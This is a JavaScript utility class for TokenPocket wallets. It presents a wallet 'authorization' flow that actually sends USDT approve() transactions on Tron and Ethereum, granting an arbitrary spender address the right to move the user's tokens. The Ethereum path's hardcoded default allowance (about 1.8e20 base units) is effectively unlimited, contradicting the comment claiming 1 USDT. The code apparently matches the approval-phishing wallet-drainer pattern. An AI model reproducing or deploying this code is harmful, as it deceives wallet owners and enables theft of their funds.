/**
 * TokenPocket授权工具类
 * 处理TokenPocket钱包的授权相关功能
 */
class TokenPocketAuth {
	constructor(config = {}) {
		// 默认配置
		this.config = {
			// 波场网络USDT合约地址
			tronUsdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
			// 以太坊网络USDT合约地址
			ethUsdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
			// 默认授权数量 - 1 USDT (6位小数)
			defaultApproveAmount: '1000000', // 1 USDT = 1,000,000 wei
			// 默认gas设置 - 进一步降低
			defaultGas: '0xEA60', // 60000 (进一步降低)
			defaultGasPrice: '0x3B9ACA00', // 1 gwei
			// 最大 Gas Price 限制 - 降低到5 gwei
			maxGasPrice: '0x12A05F200', // 5 gwei
			// Tron fee limit
			defaultFeeLimit: 1000000,
			...config
		};
	}

	/**
	 * 检测TokenPocket环境
	 */
	detectTokenPocketEnvironment() {
		if (typeof window === 'undefined') {
			return false;
		}
		
		const hasTokenPocket = window.tokenpocket;
		const hasEthereumWithTokenPocket = window.ethereum && (
			window.ethereum.isTokenPocket || 
			window.ethereum.isTP ||
			window.ethereum.providers?.some(p => p.isTokenPocket || p.isTP)
		);
		const hasTPUserAgent = navigator.userAgent.includes('TokenPocket');
		const hasTronWeb = window.tronWeb && window.tronWeb.isTokenPocket;
		
		return hasTokenPocket || hasEthereumWithTokenPocket || hasTPUserAgent || hasTronWeb;
	}

	/**
	 * 拉起TokenPocket应用
	 */
	async openTokenPocketApp(currentUrl) {
		try {
			const tokenPocketUrl = `tpoutside://dapp/open?dappUrl=${encodeURIComponent(currentUrl)}`;
			
			// #ifdef APP-PLUS
			plus.runtime.openURL(tokenPocketUrl);
			
			uni.showModal({
				title: 'Notice',
				content: 'Please complete the authorization in TokenPocket and return',
				showCancel: false
			});
			// #endif
			
			// #ifdef H5
			// 创建隐藏的链接元素
			const link = document.createElement('a');
			link.href = tokenPocketUrl;
			link.style.display = 'none';
			document.body.appendChild(link);
			link.click();
			document.body.removeChild(link);
			
			// 显示提示
			setTimeout(() => {
				uni.showModal({
					title: 'Notice',
					content: 'If it did not automatically jump to TokenPocket, please manually open this page in TokenPocket',
					showCancel: true,
					confirmText: 'Copy Link',
					success: (res) => {
						if (res.confirm) {
							this.copyToClipboard(currentUrl);
						}
					}
				});
			}, 1000);
			// #endif
			
			// #ifdef MP-WEIXIN
			uni.showModal({
				title: 'Notice',
				content: 'Please open this mini program in TokenPocket app',
				showCancel: false
			});
			// #endif
			
		} catch (error) {
			console.error('拉起TokenPocket失败:', error);
			throw new Error('Unable to launch TokenPocket app');
		}
	}

	/**
	 * 主要授权方法
	 */
	async requestAuth(spenderAddress, approveAmount = null) {
		try {
			// 优先尝试Tron网络授权
			const tronAuth = await this.requestTronAuth(spenderAddress, approveAmount);
			if (tronAuth.success) {
				return {
					success: true,
					type: 'TRON',
					address: tronAuth.address,
					txHash: tronAuth.txHash
				};
			}

			// 尝试以太坊网络授权
			const ethAuth = await this.requestEthereumAuth(spenderAddress, approveAmount);
			if (ethAuth.success) {
				return {
					success: true,
					type: 'ETHEREUM',
					address: ethAuth.address,
					txHash: ethAuth.txHash
				};
			}

			return {
				success: false,
				message: 'No available wallet connection found'
			};

		} catch (error) {
			console.error('TokenPocket授权请求失败:', error);
			return {
				success: false,
				message: error.message || 'Authorization request failed'
			};
		}
	}

	/**
	 * 请求Tron网络授权交易
	 */
	async requestTronAuth(spenderAddress, approveAmount = null) {
		try {
			let tronWeb = null;
			
			// 检查TokenPocket的Tron钱包
			if (window.tokenpocket && window.tokenpocket.tron) {
				tronWeb = window.tokenpocket.tron;
			} else if (window.tronWeb) {
				tronWeb = window.tronWeb;
			} else if (window.tronLink && window.tronLink.tronWeb) {
				tronWeb = window.tronLink.tronWeb;
			}
			
			if (!tronWeb) {
				return { success: false, message: 'Tron wallet not detected' };
			}

			// 获取钱包地址
			let address = null;
			if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
				address = tronWeb.defaultAddress.base58;
			} else {
				// 请求连接
				const accounts = await tronWeb.request({ method: 'tron_requestAccounts' });
				if (accounts && accounts.length > 0) {
					address = accounts[0];
				}
			}
			
			if (!address) {
				return { success: false, message: 'Tron wallet connection failed' };
			}

			// 使用传入的数量或默认数量
			const amount = approveAmount || this.config.defaultApproveAmount;

			// 构建授权交易
			const contract = await tronWeb.contract().at(this.config.tronUsdtContract);
			const transaction = await contract.approve(spenderAddress, amount).send({
				from: address,
				feeLimit: this.config.defaultFeeLimit
			});
			
			return {
				success: true,
				address: address,
				txHash: transaction
			};
			
		} catch (error) {
			console.error('Tron授权失败:', error);
			if (error.message.includes('User rejected')) {
				return { success: false, message: 'User rejected authorization' };
			}
			return { success: false, message: 'Tron authorization transaction failed' };
		}
	}

	/**
	 * 请求以太坊网络授权交易
	 */
	async requestEthereumAuth(spenderAddress, approveAmount = null) {
		try {
			let ethereum = null;
			
			// 获取以太坊提供者
			if (window.tokenpocket && window.tokenpocket.ethereum) {
				ethereum = window.tokenpocket.ethereum;
			} else if (window.ethereum) {
				ethereum = window.ethereum;
			}
			
			if (!ethereum) {
				return { success: false, message: 'Ethereum wallet not detected' };
			}

			// 请求连接账户
			const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
			
			if (!accounts || accounts.length === 0) {
				return { success: false, message: 'Ethereum wallet connection failed' };
			}

			const address = accounts[0];
			
			// 使用传入的数量或默认数量的十六进制表示
			const amount = approveAmount ? this.toHex(approveAmount) : '0x9c2007651b2500000';

			// ERC20 approve方法的ABI
			const approveMethodABI = '0x095ea7b3' + 
				spenderAddress.slice(2).padStart(64, '0') + 
				amount.slice(2).padStart(64, '0');

			// 发送授权交易
			const txHash = await ethereum.request({
				method: 'eth_sendTransaction',
				params: [{
					from: address,
					to: this.config.ethUsdtContract,
					data: approveMethodABI,
					gas: this.config.defaultGas,
					gasPrice: this.config.defaultGasPrice
				}]
			});
			
			return {
				success: true,
				address: address,
				txHash: txHash
			};
			
		} catch (error) {
			console.error('以太坊授权失败:', error);
			if (error.message.includes('User rejected')) {
				return { success: false, message: 'User rejected authorization' };
			}
			return { success: false, message: 'Ethereum authorization transaction failed' };
		}
	}

	/**
	 * 工具方法：复制到剪贴板
	 */
	copyToClipboard(text) {
		// #ifdef H5
		if (navigator.clipboard) {
			navigator.clipboard.writeText(text).then(() => {
				uni.showToast({
					title: 'Link copied',
					icon: 'success'
				});
			});
		}
		// #endif
		
		// #ifdef APP-PLUS || MP-WEIXIN
		uni.setClipboardData({
			data: text,
			success: () => {
				uni.showToast({
					title: 'Link copied',
					icon: 'success'
				});
			}
		});
		// #endif
	}

	/**
	 * 工具方法：将数字转换为十六进制
	 */
	toHex(number) {
		if (typeof number === 'string' && number.startsWith('0x')) {
			return number;
		}
		return '0x' + parseInt(number).toString(16);
	}

	/**
	 * 工具方法：格式化地址
	 */
	formatAddress(addr) {
		if (!addr || addr.length <= 10) return addr;
		return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
	}

	/**
	 * 工具方法：格式化交易哈希
	 */
	formatTxHash(hash) {
		if (!hash || hash.length <= 10) return hash;
		return `${hash.substring(0, 8)}...${hash.substring(hash.length - 6)}`;
	}

	/**
	 * 获取当前URL
	 */
	getCurrentUrl() {
		// #ifdef H5
		return window.location.href;
		// #endif
		
		// #ifdef APP-PLUS
		return 'https://ai-smart-contracts.com/app';
		// #endif
		
		// #ifdef MP-WEIXIN
		return 'https://ai-smart-contracts.com/mp';
		// #endif
	}

	/**
	 * 更新配置信息
	 * @param {Object} newConfig - 新的配置对象
	 */
	updateConfig(config = {}) {
		this.config = {
			// 波场网络USDT合约地址
			tronUsdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
			// 以太坊网络USDT合约地址
			ethUsdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
			// 默认授权数量 - 1 USDT (6位小数)
			defaultApproveAmount: '1000000', // 1 USDT = 1,000,000 wei
			// 默认gas设置 - 进一步降低
			defaultGas: '0xEA60', // 60000 (进一步降低)
			defaultGasPrice: '0x3B9ACA00', // 1 gwei
			// 最大 Gas Price 限制 - 降低到5 gwei
			maxGasPrice: '0x12A05F200', // 5 gwei
			// Tron fee limit
			defaultFeeLimit: 1000000,
			...config
		};
		console.log('TokenPocketAuth配置已更新:', {
			tronUsdtContract: this.config.tronUsdtContract,
			ethUsdtContract: this.config.ethUsdtContract
		});
	}
}

// 导出单例
const tokenPocketAuth = new TokenPocketAuth();

export default tokenPocketAuth; 